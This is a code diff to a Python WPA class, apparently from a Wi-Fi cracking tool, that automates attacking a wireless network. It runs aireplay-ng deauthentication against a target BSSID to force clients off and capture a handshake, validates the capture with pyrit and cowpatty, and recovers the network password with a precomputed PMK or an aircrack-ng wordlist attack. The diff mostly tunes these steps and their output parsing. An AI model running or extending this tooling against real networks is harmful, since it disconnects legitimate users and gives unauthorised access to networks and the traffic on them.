@@ -27,23 +27,24 @@ class WPA(EncryptionType):
         print("scanned parent")
         valid_handshake = False
 
-        out, err = self.execute_command(['ls', '/tmp/WiCC/'])
-        print(out)
-        pyrit_cmd = ['pyrit', '-r', write_directory, 'analyze']
-        de_auth_cmd = ['aireplay-ng', '-0', '1', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface + 'mon']
-
-        second_iterator = 0  # when 15, de-auth's clients on the network
         self.calculate_pmk(write_directory)
 
         write_directory += 'net_attack-01.cap'
 
+        pyrit_cmd = ['pyrit', '-r', write_directory + '.bak', 'analyze']
+        cowpatty_cmd = ['cowpatty', '-c', '-r', write_directory]
+        de_auth_cmd = ['aireplay-ng', '-0', '3', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface + 'mon']
+
+        second_iterator = 5  # when 15, de-auth's clients on the network
+
         while not valid_handshake:
             pyrit_out, err = self.execute_command(pyrit_cmd)
-            valid_handshake = self.filter_pyrit_out(pyrit_out)
+            cowpatty_out, err = self.execute_command(cowpatty_cmd)
+            valid_handshake = self.filter_pyrit_out(pyrit_out) or self.filter_cowpatty_out(cowpatty_out)
             if not valid_handshake:
                 time.sleep(1)
                 second_iterator += 1
-                if second_iterator == 5:
+                if second_iterator == 6:
                     print("de-authing . . .")
                     out, err = self.execute_command(de_auth_cmd)
                     second_iterator = 0
@@ -53,19 +54,33 @@ class WPA(EncryptionType):
         # 1' 46" scanning
         # 5' 15" cracking (4' 30" only on cracking)
 
+    def kill_genpmk(self):
+        pgrep_cmd = ['pgrep', 'genpmk']
+        pgrep_out, pgrep_err = self.execute_command(pgrep_cmd)
+
+        pgrep_out = pgrep_out.decode('utf-8')
+
+        if pgrep_out != "":
+            pids = pgrep_out.split('\n')
+            for pid in pids:
+                self.execute_command(['kill', '-9', pid])  # kills all processes related with the process
+                print("killed pid " + pid)
+
     def crack_network(self):
         if self.pmk != "":
+            self.kill_genpmk()
             cowpatty_cmd = ['cowpatty', '-d', self.pmk, '-s', self.essid, '-r', '/tmp/WiCC/net_attack-01.cap']
             cowpatty_out, cowpatty_err = self.execute_command(cowpatty_cmd)
-            cowpatty_out = cowpatty_out.decode('utf-8')
-            password = self.filter_cowpatty(cowpatty_out)
+            cowpatty_out = cowpatty_out.decode('utf-8').split("\n")
+            password = self.filter_cowpatty_psk(cowpatty_out)
             if password != "":
                 print("password gathered from pmk")
                 return password
             else:
                 print("no password on pmk")
+                print(cowpatty_cmd)
 
-        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap', '-w', self.wordlist]
+        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap', '-w', self.wordlist, '>', '/tmp/WiCC/aicrack-out']
         aircrack_out, aircrack_err = self.execute_command(aircrack_cmd)
         aircrack_out = aircrack_out.decode('utf-8')
         password = self.filter_aircrack(aircrack_out)
@@ -78,35 +93,20 @@ class WPA(EncryptionType):
         genpmk_thread.start()
         genpmk_thread.join(0)
         print("calculating pmk...")
+        print(genpmk_cmd)
 
-    @staticmethod
-    def filter_aircrack(output):
-        words = output.split(" ")
-        next_1 = False
-        next_2 = False
-        for word in words:
-            if word[:6] == "FOUND!":
-                next_1 = True
-            elif next_1:
-                if not next_2:
-                    next_2 = True
-                else:
-                    return word
-        return ""
-
-    def filter_cowpatty(self, output):
+    def filter_cowpatty_psk(self, output):
         for line in output:
-            words = line.split(' ')
-            if words[0] == "The" and words[1] == "PSK" and words[2] == "is":
-                print("found valid psk")
-                return words[3][1:-1]
+            if line == 'Unable to identify the PSK from the dictionary file. Try expanding your':
+                print("No valid PSK")
+                return ""
+            elif 'The PSK is' in line:
+                words = line.split(" ")
+                psk = words[3][1:-2]  # [1:-2] is to remove the " " surrounding the psk
+                print("Found PSK: " + psk)
+                return psk
             else:
-                print("     invalid psk")
                 print(line)
-                print(words[0])
-                print(words[1])
-                print(words[2])
-                print(words[3][1:-1])
         return ""
 
 #--------------------------------------------------------------------------------------
